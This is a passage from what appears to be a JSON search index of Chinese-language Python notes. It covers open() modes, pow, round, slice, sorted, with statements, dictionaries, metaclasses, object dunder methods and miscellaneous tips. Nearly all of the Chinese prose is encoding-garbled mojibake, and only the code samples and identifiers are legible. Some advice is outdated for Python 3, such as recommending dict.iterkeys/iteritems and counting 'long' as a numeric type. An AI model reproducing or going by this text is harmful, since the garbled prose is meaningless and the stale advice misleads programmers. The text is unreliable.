¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨åˆ™æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶ä»å¼€å¤´å¼€å§‹ç¼–è¾‘ï¼Œå³åŸæœ‰å†…å®¹ä¼šè¢«åˆ é™¤ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ã€‚ä¸€èˆ¬ç”¨äºéæ–‡æœ¬æ–‡ä»¶å¦‚å›¾ç‰‡ç­‰ã€‚ a æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚ ab ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ–°çš„å†…å®¹å°†ä¼šè¢«å†™å…¥åˆ°å·²æœ‰å†…å®¹ä¹‹åã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶è¿›è¡Œå†™å…¥ã€‚ a+ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¯»å†™ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚æ–‡ä»¶æ‰“å¼€æ—¶ä¼šæ˜¯è¿½åŠ æ¨¡å¼ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚ ab+ ä»¥äºŒè¿›åˆ¶æ ¼å¼æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºè¿½åŠ ã€‚å¦‚æœè¯¥æ–‡ä»¶å·²å­˜åœ¨ï¼Œæ–‡ä»¶æŒ‡é’ˆå°†ä¼šæ”¾åœ¨æ–‡ä»¶çš„ç»“å°¾ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ–‡ä»¶ç”¨äºè¯»å†™ã€‚ x æ–‡ä»¶ä¸å­˜åœ¨æ‰èƒ½å†™å…¥ file å¯¹è±¡æ–¹æ³• å®ä¾‹ æµ‹è¯•æ–‡ä»¶ test.txtï¼Œå†…å®¹å¦‚ä¸‹: RUNOOB1 RUNOOB2 >>>f = open('test.txt') >>> f.read() 'RUNOOB1\\nRUNOOB2\\n'","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-open.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-open.html"},{"title":"pow","text":"pow() æ–¹æ³•è¿”å› xyï¼ˆx çš„ y æ¬¡æ–¹ï¼‰ çš„å€¼ã€‚ math æ¨¡å—ä¸­ä¹Ÿæä¾›äº†è¿™ä¸ªå‡½æ•° math æ¨¡å— pow() æ–¹æ³•çš„è¯­æ³•: import math math . pow ( x , y ) å†…ç½®çš„ pow() æ–¹æ³• pow ( x , y [, z ]) å‡½æ•°æ˜¯è®¡ç®— x çš„ y æ¬¡æ–¹ï¼Œå¦‚æœ z åœ¨å­˜åœ¨ï¼Œåˆ™å†å¯¹ç»“æœè¿›è¡Œå–æ¨¡ï¼Œå…¶ç»“æœç­‰æ•ˆäº: pow(x,y) % z æ³¨è§£ pow() é€šè¿‡å†…ç½®çš„æ–¹æ³•ç›´æ¥è°ƒç”¨ï¼Œ å†…ç½®æ–¹æ³•ä¼šæŠŠå‚æ•°ä½œä¸ºæ•´å‹ ï¼Œè€Œ math æ¨¡å—åˆ™ä¼šæŠŠå‚æ•°è½¬æ¢ä¸º float ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-pow.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-pow.html"},{"title":"print","text":"è¿™ä¸ªæœ¬æ¥ä¸ç”¨è¯´çš„, ä½†æ˜¯æƒ³äº†æƒ³è¿˜æ˜¯è®°å½•ä¸€ä¸‹ æ³¨è§£ å…¶å®å¤§å¤šå±äºå­—ç¬¦ä¸²è¾“å‡ºæœ¬èº«çš„ è¾“å‡ºæŒ‡å®šè¡Œé•¿åº¦, å¯ä»¥ä½¿ç”¨ {:é•¿åº¦} å½¢å¼; æ¯”å¦‚è¾“å‡º123, é•¿åº¦ä¸º40: In [3]: \"|{:40}|\".format(\"123\") Out[3]: '|123 |' In [4]: f\"|{'123':40}|\" Out[4]: '|123 |' printä¸sys.stdout.write sys.stdout.write() åªèƒ½è¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²strï¼Œè€Œ print() å¯ä»¥è¾“å‡ºå¤šä¸ªå€¼ï¼Œæ•°æ®ç±»å‹å¤šæ ·ã€‚ print(obj) å®é™…ä¸Šæ˜¯è°ƒç”¨ sys.stdout.write(obj+'\\n') ï¼Œå› æ­¤printåœ¨æ‰“å°æ—¶ä¼šè‡ªåŠ¨åŠ ä¸ªæ¢è¡Œç¬¦ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-print.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-print.html"},{"title":"round","text":"round() æ–¹æ³•è¿”å›æµ®ç‚¹æ•°xçš„å››èˆäº”å…¥å€¼ã€‚ ä¸è¿‡æœ‰ä¸€ä¸ªå‘. æ­£å¸¸æƒ…å†µä¸æ˜¯æ•°å­¦æ„æ€ä¸Šçš„å››èˆäº”å…¥è€Œæ˜¯å››èˆå…­å…¥ åœ¨ Python2 ä¸­, å¦‚æœnçš„åä¸€ä½ä¸º 5 æ—¶, æœ€ç»ˆè¿”å›å€¼ä¸ºè·ç¦»0è¿œçš„ä¸€è¾¹; åœ¨ Python3 ä¸­, å¦‚æœnçš„åä¸€ä½ä¸º 5 æ—¶, æœ€ç»ˆè¿”å›å€¼ä¼šä¿ç•™åˆ°å¶æ•°çš„ä¸€è¾¹. å¦‚: round(1.5) Out[6]: 2 round(0.5) Out[7]: 0 å¦å¤–è¿˜æœ‰ä¸€ä¸ªæƒ…å†µ: round(2.355, 2) Out[3]: 2.35 ä¸ç®¡æ˜¯å“ªä¸ªç‰ˆæœ¬, ç†è®ºä¸Šéƒ½åº”è¯¥æ˜¯æ˜¯ 2.36 çš„, ä½†æ˜¯ç”±äºç²¾åº¦é—®é¢˜, ä¼šå¯¼è‡´æœºå™¨å†…éƒ¨å®é™…è¡¨ç¤ºçš„æ•°å€¼æ¯”çœ‹åˆ°çš„å€¼è¦å°, ä»¥è‡³äºå‡ºç°è¿™ç§æƒ…å†µ, å¹¶ä¸æ˜¯bug","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-round.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-round.html"},{"title":"slice","text":"åˆ‡ç‰‡æ“ä½œ slice() å‡½æ•°è¿”å› slice å¯¹è±¡ï¼ˆåˆ‡ç‰‡ï¼‰ã€‚ slice å¯¹è±¡ç”¨äºæŒ‡å®šå¦‚ä½•å¯¹åºåˆ—è¿›è¡Œè£åˆ‡ã€‚ æ‚¨å¯ä»¥æŒ‡å®šåœ¨å“ªé‡Œå¼€å§‹è£åˆ‡ä»¥åŠåœ¨å“ªé‡Œç»“æŸè£åˆ‡ã€‚ æ‚¨è¿˜å¯ä»¥æŒ‡å®šæ­¥è¿›ï¼Œä¾‹å¦‚åªåˆ‡æ¯éš”ä¸€ä¸ªé¡¹ç›®ã€‚ æ”¯æŒæœ‰è¶£çš„æ“ä½œ: >>> items = [0, 1, 2, 3, 4, 5, 6] >>> a = slice(2, 4) >>> items[2:4] [2, 3] >>> items[a] [2, 3] >>> items[a] = [10,11] >>> items [0, 1, 10, 11, 4, 5, 6] >>> del items[a] >>> items [0, 1, 4, 5, 6] å¯ä»¥åˆ†åˆ«è°ƒç”¨å®ƒçš„ a.start , a.stop , a.step å±æ€§ æ¥è·å–æ›´å¤šçš„ä¿¡æ¯ã€‚æ¯”å¦‚: >>> a = slice(5, 50, 2) >>> a.start 5 >>> a.stop 50 >>> a.step 2 >>> è¿˜èƒ½é€šè¿‡è°ƒç”¨åˆ‡ç‰‡çš„ indices(size) æ–¹æ³•å°†å®ƒæ˜ å°„åˆ°ä¸€ä¸ªç¡®å®šå¤§å°çš„åº åˆ—ä¸Šï¼Œ è¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªä¸‰å…ƒç»„ (start, stop, step) ï¼Œæ‰€æœ‰å€¼éƒ½ä¼šè¢«åˆé€‚çš„ç¼©å°ä»¥ æ»¡è¶³è¾¹ç•Œé™åˆ¶ï¼Œ ä»è€Œä½¿ç”¨çš„æ—¶å€™é¿å…å‡ºç° IndexError å¼‚å¸¸ã€‚æ¯”å¦‚: >>> s = 'HelloWorld' >>> a.indices(len(s)) (5, 10, 2) >>> for i in range(*a.indices(len(s))): ... print(s[i]) ... W r d >>>","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-slice.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-slice.html"},{"title":"sorted","text":"å¯¹æ‰€æœ‰å¯è¿­ä»£çš„å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œ sort ä¸ sorted åŒºåˆ«ï¼š sort æ˜¯åº”ç”¨åœ¨ list ä¸Šçš„æ–¹æ³•ï¼Œsorted å¯ä»¥å¯¹æ‰€æœ‰å¯è¿­ä»£çš„å¯¹è±¡è¿›è¡Œæ’åºæ“ä½œã€‚ list çš„ sort æ–¹æ³•è¿”å›çš„æ˜¯å¯¹å·²ç»å­˜åœ¨çš„åˆ—è¡¨è¿›è¡Œæ“ä½œï¼Œæ— è¿”å›å€¼. å†…å»ºå‡½æ•° sorted æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ªæ–°çš„ listï¼Œè€Œä¸æ˜¯åœ¨åŸæ¥çš„åŸºç¡€ä¸Šè¿›è¡Œçš„æ“ä½œã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-sorted.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-sorted.html"},{"title":"with","text":"withç›¸å½“äº try catch finnallyè¯­å¥ è‡ªå®šä¹‰çš„withè¯­å¥, éœ€è¦å®ç°: # coding: utf-8 class TW(object): # withåŒ…å«åˆå§‹åŒ–æ—¶æ‰§è¡Œ, è¿”å›å€¼ç»™åˆ°è¯­å¥å®šä¹‰çš„asåˆ«å def __enter__(self): return 999 # å‡ºç°å¼‚å¸¸æˆ–è€…æ­£å¸¸ç»“æŸæ—¶å€™æ‰§è¡Œ # è¿”å›å€¼ä¸ºTrueæ—¶, ä¸æŠ›å‡ºå¼‚å¸¸, å¦åˆ™æ­£å¸¸æŠ›å‡ºå¼‚å¸¸ def __exit__(self, exc_type, exc_val, exc_tb): if exc_tb: print(exc_type, exc_val, exc_tb) return True with TW() as t: print(t) raise ValueError('error test') async withè¯­å¥ å¼‚æ­¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨. ç”¨äºå¼‚æ­¥ç¼–ç¨‹. ä¸ with ä¸åŒçš„æ˜¯, å¦‚æœè¦å®ç°å¼‚æ­¥çš„è°ƒç”¨, éœ€è¦å®ç° __aenter__ ä¸ __aexit__ æ–¹æ³•: class AsyncContextManager: async def __aenter__(self): await log('entering context') async def __aexit__(self, exc_type, exc, tb): await log('exiting context') è¿™æ—¶å°±å¯ä»¥å¼‚æ­¥è°ƒç”¨: async with AsyncContextManager(): ...","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Built--in-function-with.html","loc":"/yq-doc-source-docs-rear-end-python-Built--in-function-with.html"},{"title":"å­—å…¸æ“ä½œ","text":"å­—å…¸çš„ä¸€äº›è¯´æ˜ Python3.7ä¹‹å, å­—å…¸çš„éå†æ˜¯æœ‰åºçš„(é€šè¿‡ä½¿ç”¨ä¸€ä¸ªæ’åºè¿‡çš„åŒé“¾è¡¨æ¥ä¿å­˜é”®å€¼å¯¹å®ç°), ä¸è¿‡, å­—å…¸åœ¨æ’å…¥æ—¶ä»ç„¶æ— åº, æœ‰åºæ€§ä»…ä½“ç°åœ¨éå†å’Œæ’åºæ—¶. ä½¿ç”¨sortedæ’åº æŠ€å·§ ä»…é’ˆå¯¹Python3.7 ä¹‹åçš„ç‰ˆæœ¬ æµ‹è¯•ä»£ç : data = { 'a': 1, 'b': 2, 'outer': 3, 'c': 4 } print('origin ========') for one in data: print(one) data_new = sorted(data, key=lambda o: o != 'outer', reverse=False) print('after sort ========') for one in data_new: print(one) è¾“å‡º: origin ======== a b outer c after sort ======== outer a b c è¿™é‡Œæˆ‘æ²¡æœ‰å¼„æ˜ç™½ä¸ºä»€ä¹ˆ o != 'outer' ç»“æœæ˜¯æ”¾åœ¨æœ€å‰é¢, è€Œ o == 'outer' , outeråœ¨æœ€å. åˆå¹¶å­—å…¸çš„æ–¹å¼ æ³¨æ„ **a2 è¿™é‡Œï¼Œ keyä¸èƒ½ä¸º éstr, å› ä¸ºæ˜¯å½“åšå‚æ•°ä¼ é€’è§£æçš„: a1, a2 = dict(), dict() b = dict(a1, **a2)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Dictionary.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Dictionary.html"},{"title":"å…ƒç±»","text":"é»˜è®¤æƒ…å†µä¸‹ï¼Œç±»æ˜¯ä½¿ç”¨ type() æ¥æ„å»ºçš„ã€‚ç±»ä½“ä¼šåœ¨ä¸€ä¸ªæ–°çš„å‘½åç©ºé—´å†…æ‰§è¡Œï¼Œ ç±»åä¼šè¢«å±€éƒ¨ç»‘å®šåˆ° type(name, bases, namespace) çš„ç»“æœã€‚ ç±»åˆ›å»ºè¿‡ç¨‹å¯é€šè¿‡åœ¨å®šä¹‰è¡Œä¼ å…¥ metaclass å…³é”®å­—å‚æ•°ï¼Œæˆ–æ˜¯é€šè¿‡ç»§æ‰¿ä¸€ä¸ªåŒ…å«æ­¤å‚æ•°çš„ç°æœ‰ç±»æ¥è¿›è¡Œå®šåˆ¶ã€‚ åœ¨ä»¥ä¸‹ç¤ºä¾‹ä¸­ï¼ŒMyClass å’Œ MySubclass éƒ½æ˜¯ Meta çš„å®ä¾‹: class Meta(type): pass class MyClass(metaclass=Meta): pass class MySubclass(MyClass): pass","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Meta--category.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Meta--category.html"},{"title":"objectç±»","text":"æ–¹æ³• new init getattribute getattr setattr delattr enter exit str class iter getitem setitem __new__ __init__ __getattribute__ __setattr__ __delattr__ __enter__/__exit__ __str__() code: def __str__(self, *args, **kwargs): ... è®¾ç½®ç›´æ¥æ‰“å°å®ä¾‹æ—¶çš„å€¼, å¯ä»¥ç†è§£æˆå°†å…¶è½¬æ¢ä¸ºstrç±»å‹çš„å€¼ __class__ ä½¿è‡ªèº«å¯è¿­ä»£, å³å¯ä½¿ç”¨ for/next å¾ªç¯. ä½¿è‡ªèº«å¯ä»¥ç”¨å­—å…¸çš„å½¢å¼ obj['x'] æ¥å–å€¼. __setitem__ å¯ä¸ getitem ä¸€èµ·ä½¿ç”¨, ä¸è¿‡è¿™ä¸ªæ˜¯è®¾ç½®å€¼çš„. other å¾…åé¢è¡¥å……: def __eq__(self, o: object) -> bool: ... def __ne__(self, o: object) -> bool: ... def __str__(self) -> str: ... def __repr__(self) -> str: ... def __hash__(self) -> int: ... def __format__(self, format_spec: str) -> str: ... def __sizeof__(self) -> int: ... def __reduce__(self) -> Union[str, Tuple[Any, ...]]: ... def __reduce_ex__(self, protocol: int) -> Union[str, Tuple[Any, ...]]: ... def __dir__(self) -> Iterable[str]: ... def __init_subclass__(cls) -> None: ... ç±»å±æ€§ æˆ–è€…è¯´æˆå‘˜å˜é‡ __slots__ __dict__ __doc__ __module__ __annotations__","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Object-class.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Object-class.html"},{"title":"åŒ…/æ¨¡å—ç»“æ„è¯´æ˜","text":"åœ¨å®˜ç½‘ä¸‹è½½å¥½å¹¶å®‰è£…å¥½å, å¯ä»¥å‘ç°åŒ…å­˜æ”¾çš„ç›®å½•æœ‰ Lib ç›®å½•å­˜æ”¾æ ‡å‡†åº“ Lib/site-packages ç›®å½•å­˜æ”¾å®‰è£…çš„ç¬¬ä¸‰æ–¹åŒ…/æ¨¡å— Script ç›®å½•å­˜æ”¾å¯æ‰§è¡Œæ–‡ä»¶, å¦‚python/pip (Unixè²Œä¼¼æ˜¯ bin) æ¨¡å— æ¯ä¸€ä¸ªå•ç‹¬çš„pyæ–‡ä»¶, æ¯”å¦‚main.py, å°±æ˜¯æ¨¡å— åŒ… åŒ…åŒ…å«äº†å¤šä¸ªæ¨¡å—, å±äºä¸€ç§æœ‰ç»„ç»‡çš„ç»“æ„","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Pack,-module-structure.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Pack,-module-structure.html"},{"title":"pythonå‘½ä»¤é€‰é¡¹ä¸å‚æ•°","text":"-m <module> æŒ‡å®šæ¨¡å— -i æ‰§è¡Œç»“æŸæ—¶æ‰“å¼€äº¤äº’å¼ç•Œé¢","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Python-command-options-and-parameters.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python-command-options-and-parameters.html"},{"title":"Pythonçº¿ç¨‹æ± åŠå…¶åŸç†","text":"","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Concept-Python-thread-pool-and-its-principle.html","loc":"/yq-doc-source-docs-rear-end-python-Concept-Python-thread-pool-and-its-principle.html"},{"title":"Pythonä½¿ç”¨æŠ€å·§/é—®é¢˜","text":"è¿›åº¦æ¡ æœ€åŸå§‹æ•°å­—å®ç°: def print_hi(): n = 100 for i in range(n): for j in range(n): j += i print(f\"{i+1} / {n}\", end='\\r') æ•ˆæœ: 8622 / 10000 ç™¾åˆ†æ¯”è¿›åº¦æ¡: def print_hi(): n = 10000 for i in range(n): for j in range(n): j += i # print(i) # print(f\"{i+1} / {n}\", end='\\r') print(\"è¿›åº¦Â·\", f\"|{ '+' * ((i+1) * 100 // n):100}|\", f\"{(i+1) * 100 // n}/%\", end='\\r') æ•ˆæœ å…¶ä»–ç¬¬ä¸‰æ–¹è¿›åº¦æ¡åº“æ¨¡å—: /docs/åç«¯/python/pythonä¸‰æ–¹åº“/progress /docs/åç«¯/python/pythonä¸‰æ–¹åº“/tqdm /docs/åç«¯/python/pythonä¸‰æ–¹åº“/alive-progress å¤šèµ‹å€¼ æ™®é€šå¤šèµ‹å€¼: In [10]: product_info = ['apple', '5', 1000] In [11]: name, price, num = product_info In [12]: name, price, num Out[12]: ('apple', '5', 1000) In [13]: å¦‚æœåªéœ€è¦éƒ¨åˆ†, å…¶å®ƒçš„ä»»æ„å˜é‡å ä½å³å¯, å¦‚åªéœ€è¦name: In [13]: name, *_ = product_info In [14]: name, _ Out[14]: ('apple', ['5', 1000]) æŠ€å·§ å¯ä½¿ç”¨ * èµ‹å€¼ä¸ºåˆ—è¡¨ é€‚ç”¨ä¸ä»»ä½•å¯è¿­ä»£å¯¹è±¡, å¦‚list, str è·å–å‚æ•°åˆ—è¡¨ å‡½æ•°å†…éƒ¨ å‡½æ•°å†…éƒ¨ è·å–, ä½¿ç”¨ locals In [1]: def fun1(a, b, c): ...: d = 4 ...: print(locals()) ...: print(a, b, c) ...: In [2]: fun1(1, 2, 3) {'a': 1, 'b': 2, 'c': 3, 'd': 4} 1 2 3 å‡½æ•°å¤–éƒ¨ å‡½æ•°å¤–éƒ¨ è·å–, ä½¿ç”¨ __code__.co_varnames , åªèƒ½è·å–å‚æ•°å In [4]: fun1.__code__.co_varnames Out[4]: ('a', 'b', 'c', 'd') æˆ–è€…ä½¿ç”¨ inspect æ¨¡å—, è·å–å½¢å‚åˆ—è¡¨å’Œé»˜è®¤å‚æ•°, ä¾‹: In [8]: import inspect In [9]: inspect.getargspec(fun1) <ipython-input-9-96541cc6565c>:1: DeprecationWarning: inspect.getargspec() is deprecated since Python 3.0, use inspect.signature() or inspect.getfullargspec() inspect.getargspec(fun1) Out[9]: ArgSpec(args=['a', 'b', 'c'], varargs=None, keywords=None, defaults=None) In [10]: inspect.signature(fun1) Out[10]: <Signature (a, b, c)> In [11]: inspect.getfullargspec(fun1) Out[11]: FullArgSpec(args=['a', 'b', 'c'], varargs=None, varkw=None, defaults=None, kwonlyargs=[], kwonlydefaults=None, annotations={}) çœ‹èµ·æ¥å»ºè®®ä½¿ç”¨ getfullargspec è·å–çš„æœ€è¯¦ç»†. æŠ€å·§ ç›¸å…³ è·å–å‡½æ•°å‚æ•°ä¸ªæ•°(å½¢å‚ä¸ªæ•°): In [6]: fun1.__code__.co_argcount Out[6]: 3 è·å–å‡½æ•°å‚æ•°é»˜è®¤å€¼(å…ƒç»„), å¦‚æœæœ‰: In [7]: fun1.__defaults__ å…³äºå­—å…¸ å½“å­—å…¸çš„å…ƒç´ ä¸ªæ•°å°‘äº1000æ—¶ï¼Œåº”ä½¿ç”¨: dData.keys(),dData.items(),dDate.values() å½“å­—å…¸çš„å…ƒç´ ä¸ªæ•°è¶…è¿‡1000æ—¶ï¼Œä¸ºäº†æé«˜æ•ˆç‡ï¼Œå¯ä»¥ä½¿ç”¨: dData.iterkeys(),dData.iteritems,dData.itervalues() å½“æ²¡æœ‰æŠŠæ¡æ—¶ï¼Œé‡‡ç”¨ç¬¬ä¸€ç§keysçš„æ–¹æ¡ˆ keysï¼Œitemsï¼Œvaluesä¼šåˆ›å»ºæ–°çš„å‰¯æœ¬å‚ä¸å…ƒç´ éå†ï¼Œå®‰å…¨æ€§æ›´é«˜ï¼Œ è€Œiteræ˜¯è¿­ä»£å™¨çš„æ¦‚å¿µï¼Œç›´æ¥ç”¨å…ƒç´ çš„å†…å­˜åœ°å€æŒ‡é’ˆå‚ä¸æ¯ä¸ªå…ƒç´ çš„éå† å¤šä¸ªå˜é‡çš„èµ‹å€¼ åˆ›å»ºä¸€ä¸ªæ•´å‹å¯¹è±¡ï¼Œå€¼ä¸º1ï¼Œä¸‰ä¸ªå˜é‡è¢«åˆ†é…åˆ°ç›¸åŒçš„å†…å­˜ç©ºé—´ä¸Š: a = b = c = 1 a,b,cåˆ†åˆ«è¢«èµ‹å€¼ä¸º1,2ï¼Œ\"john\": a, b, c = 1, 2, \"john\" Python äº”ä¸ªæ ‡å‡†çš„æ•°æ®ç±»å‹ Numbers: æ•°å­— String: å­—ç¬¦ä¸² List: åˆ—è¡¨ Tuple: å…ƒç»„ Dictionary: å­—å…¸ Pythonæ”¯æŒå››ç§ä¸åŒçš„æ•°å­—ç±»å‹ int: æœ‰ç¬¦å·æ•´å‹ long: é•¿æ•´å‹ï¼Œä¹Ÿå¯ä»¥ä»£è¡¨å…«è¿›åˆ¶æˆ–è€…åå…­è¿›åˆ¶ float: æµ®ç‚¹å‹ complex: å¤æ•° python2.2ä¹‹åintæº¢å‡ºåä¼šè‡ªåŠ¨è‡ªåŠ¨è½¬æ¢ä¸ºlongï¼Œ3ä¸­longè¢«ç§»é™¤ åœ¨pythonä¸­ç±»å‹å±äºå¯¹è±¡ï¼Œå˜é‡æ˜¯æ²¡æœ‰ç±»å‹çš„ å­—ç¬¦ä¸²çš„æ“ä½œ æˆªå–å­—ç¬¦ä¸²: str = 'hello' print str[1:4] #ell # str[start:end],ä»ä¸‹æ ‡startå¼€å§‹ï¼Œendç»“æŸï¼Œä¸åŒ…æ‹¬end å°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°ç»„: str = 'hi yo' print str.split() #['hi', 'yo'] # splitï¼Œä»¥æŒ‡å®šå­—ç¬¦ä¸²åˆ†éš”, ä¸å¸¦å‚é»˜è®¤æ˜¯ç©ºæ ¼ è·å–å¯¹è±¡å ç”¨çš„å†…å­˜å¤§å° sys.getsizeof() è·å–å¯¹è±¡å ç”¨çš„å†…å­˜å¤§å° sys.modules sys.modulesæ˜¯ä¸€ä¸ªå…¨å±€å­—å…¸ï¼Œè¯¥å­—å…¸æ˜¯pythonå¯åŠ¨åå°±åŠ è½½åœ¨å†…å­˜ä¸­ï¼Œ æ¯å½“å¯¼å…¥æ–°çš„æ¨¡å—ï¼Œsys.moduleséƒ½å°†è®°å½•è¿™äº›æ¨¡å—ã€‚ å­—å…¸sys.moduleså¯¹äºåŠ è½½æ¨¡å—èµ·åˆ°äº†ç¼“å†²çš„ä½œç”¨ã€‚ å½“æŸä¸ªæ¨¡å—ç¬¬ä¸€æ¬¡å¯¼å…¥ï¼Œå­—å…¸sys.moduleså°†è‡ªåŠ¨è®°å½•è¯¥æ¨¡å—ã€‚ å½“ç¬¬äºŒæ¬¡å†å¯¼å…¥è¯¥æ¨¡å—æ—¶ï¼Œpythonä¼šç›´æ¥åˆ°å­—å…¸ä¸­æŸ¥æ‰¾ï¼Œä»è€ŒåŠ å¿«äº†ç¨‹åºè¿è¡Œçš„é€Ÿåº¦ã€‚ sys.argv[] sys.argv[0]è¡¨ç¤ºä»£ç æœ¬èº«æ–‡ä»¶è·¯å¾„ä»¥åŠè°ƒç”¨æ—¶çš„å‚æ•° sys.argv[]è¯´ç™½äº†å°±æ˜¯ä¸€ä¸ªä»ç¨‹åºå¤–éƒ¨è·å–å‚æ•°çš„æ¡¥æ¢ï¼Œ è¿™ä¸ª\"å¤–éƒ¨\"å¾ˆå…³é”®ï¼Œæ‰€ä»¥é‚£äº›è¯•å›¾ä»ä»£ç æ¥è¯´æ˜å®ƒä½œç”¨çš„è§£é‡Šä¸€ç›´æ²¡çœ‹æ˜ç™½ã€‚ å› ä¸ºæˆ‘ä»¬ä»å¤–éƒ¨å–å¾—çš„å‚æ•°å¯ä»¥æ˜¯å¤šä¸ªï¼Œæ‰€ä»¥è·å¾—çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼ˆlist)ï¼Œ ä¹Ÿå°±æ˜¯è¯´sys.argvå…¶å®å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæ‰€ä»¥æ‰èƒ½ç”¨[]æå–å…¶ä¸­çš„å…ƒç´ ã€‚ å…¶ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ç¨‹åºæœ¬èº«ï¼Œéšåæ‰ä¾æ¬¡æ˜¯å¤–éƒ¨ç»™äºˆçš„å‚æ•°: sys.argv[num] #è°ƒç”¨æ—¶çš„ç¬¬numä¸ªå‚æ•°ï¼Œ0è¡¨ç¤ºè„šæœ¬æœ¬èº« å››èˆäº”å…¥ code: format(1.23456, '.2f') '%.4f' % 1.23456 è¿˜æœ‰ä¸€ä¸ª /docs/åç«¯/python/å†…ç½®å‡½æ•°/round ä¸æ˜¯å¾ˆå»ºè®®, é™¤éå¯¹ç²¾åº¦æ— è¦æ±‚ è·å–é›†åˆä¸­æœ€å¤§/å°çš„Nä¸ªå…ƒç´  å¦‚æœ N == 1, é‚£ä¹ˆè¿˜æ˜¯ä½¿ç”¨ min(), max() å¥½ç‚¹ N > 1 æ—¶, ä½¿ç”¨ /docs/åç«¯/python/pythonæ ‡å‡†åº“/heapq çš„: heapq.nlargest(n, iterable, key=None) è·å–æœ€å¤§nä¸ªå…ƒç´  heapq.nsmallest(n, iterable, key=None) è·å–æœ€å°nä¸ªå…ƒç´  å­—å…¸çš„ä¸€äº›ä¸å¸¸è§æ“ä½œ ä¾‹: a={ 'x' : 1, 'y' : 2, 'z' : 3 } b={ 'w' : 10, 'x' : 11, 'y' : 2 } æ“ä½œ: # Find keys in common a.keys() & b.keys() # { 'x', 'y' } # Find keys in a that are not in b a.keys() - b.keys() # { 'z' } # Find (key,value) pairs in common a.items() & b.items() # { ('y', 2) } ä¸€ä¸ªå­—å…¸å°±æ˜¯ä¸€ä¸ªé”®é›†åˆä¸å€¼é›†åˆçš„æ˜ å°„å…³ç³»ã€‚å­—å…¸çš„ keys() æ–¹æ³•è¿”å›ä¸€ä¸ªå±•ç° é”®é›†åˆçš„é”®è§†å›¾å¯¹è±¡ã€‚ é”®è§†å›¾çš„ä¸€ä¸ªå¾ˆå°‘è¢«äº†è§£çš„ç‰¹æ€§å°±æ˜¯å®ƒä»¬ä¹Ÿæ”¯æŒé›†åˆæ“ä½œï¼Œæ¯”å¦‚ é›†åˆå¹¶ã€äº¤ã€å·®è¿ç®—ã€‚ æ‰€ä»¥ï¼Œå¦‚æœä½ 